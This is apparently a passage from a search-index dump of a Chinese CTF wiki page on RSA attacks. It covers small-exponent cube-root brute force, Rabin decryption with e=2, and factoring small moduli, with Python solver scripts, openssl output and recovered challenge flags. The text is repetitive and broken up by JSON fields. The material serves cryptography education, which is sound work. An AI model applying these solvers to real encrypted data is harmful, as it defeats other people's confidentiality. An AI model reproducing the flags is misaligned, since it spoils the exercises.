ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 :d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97 :94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98 :03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- \u770b\u5230 e=3 e=3 \uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002 #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () \u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak} \u9898\u76ee \u00b6 RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5 \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e e=2 e=2 \u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u5bc6\u6587\uff1a c = m^2\\bmod n c = m^2\\bmod n \u89e3\u5bc6\uff1a \u8ba1\u7b97\u51fa m_p m_p \u548c m_q m_q \uff1a \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa y_p y_p \u548c y_q y_q \uff1a y_p \\cdot p + y_q \\cdot q = 1 y_p \\cdot p + y_q \\cdot q = 1 \u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \u6ce8\u610f\uff1a\u5982\u679c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \uff0c\u5219 \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 \uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230 p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 \u7f16\u5199\u4ee3\u7801 #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # \u8bfb\u53d6\u516c\u94a5\u53c2\u6570 with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) # \u8ba1\u7b97yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) # \u8ba1\u7b97mp\u548cmq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # \u8ba1\u7b97a,b,c,d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N d = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 != 0 : s = '0' + s print s . decode ( 'hex' ) \u62ff\u5230 flag\uff0c PCTF{sp3ci4l_rsa} \u3002 \u9898\u76ee \u00b6","title":"\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_1","text":"","title":"\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_2","text":"","title":"\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_3","text":"e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_4","text":"\u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 e=3 e=3 \u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a c\\equiv m^3 \\bmod N c\\equiv m^3 \\bmod N \u5219\uff1a \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e k k \uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_5","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a flag.enc \u548c pubkey.pem \uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 openssl \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 :fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97 :73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 :68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80 :01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 :c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83 :af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13 :11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 :d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97 :94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98 :03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- \u770b\u5230 e=3 e=3 \uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002 #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () \u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}","title":"\u8303\u4f8b"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_6","text":"","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin","text":"","title":"RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_7","text":"Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e e=2 e=2 \u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_8","text":"\u5bc6\u6587\uff1a c = m^2\\bmod n c = m^2\\bmod n \u89e3\u5bc6\uff1a \u8ba1\u7b97\u51fa m_p m_p \u548c m_q m_q \uff1a \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa y_p y_p \u548c y_q y_q \uff1a y_p \\cdot p + y_q \\cdot q = 1 y_p \\cdot p + y_q \\cdot q = 1 \u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \u6ce8\u610f\uff1a\u5982\u679c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \uff0c\u5219 \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_9","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 \uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230 p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 \u7f16\u5199\u4ee3\u7801 #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # \u8bfb\u53d6\u516c\u94a5\u53c2\u6570 with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) # \u8ba1\u7b97yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) # \u8ba1\u7b97mp\u548cmq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # \u8ba1\u7b97a,b,c,d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N d = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 != 0 : s = '0' + s print s . decode ( 'hex' ) \u62ff\u5230 flag\uff0c PCTF{sp3ci4l_rsa} \u3002","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_10","text":"","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/","text":"\u6a21\u6570\u76f8\u5173\u653b\u51fb \u00b6 \u66b4\u529b\u5206\u89e3 N \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002 JarvisOJ - Easy RSA \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 \"JarvisOJ - Easy RSA\" \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b \u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a N=322831561921859 e = 23 \u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \u63d0\u4ea4\u683c\u5f0f\uff1a PCTF{\u660e\u6587\u5b57\u7b26\u4e32} \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 \u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b import gmpy2 p = 13574881 q = 23781539 n = p * q e = 23 c = 0xdc2eeeb2782c phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) p = gmpy2 . powmod ( c , d , n ) tmp = hex ( p ) print tmp , tmp [ 2 :] . decode ( 'hex' ) \u7ed3\u679c\u5982\u4e0b \u279c Jarvis OJ-Basic-easyRSA git: ( master ) \u2717 python exp.py 0x33613559 3a5Y p & q \u4e0d\u5f53\u5206\u89e3 N \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 |p-q| \u5f88\u5927 \u00b6 \u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002 |p-q| \u8f83\u5c0f \u00b6 \u9996\u5148 \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \\frac{(p-q)^2}{4} \\frac{(p-q)^2}{4} \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \\frac{p+q}{2} \\frac{p+q}{2} \u4e0e \\sqrt{n} \\sqrt{n} 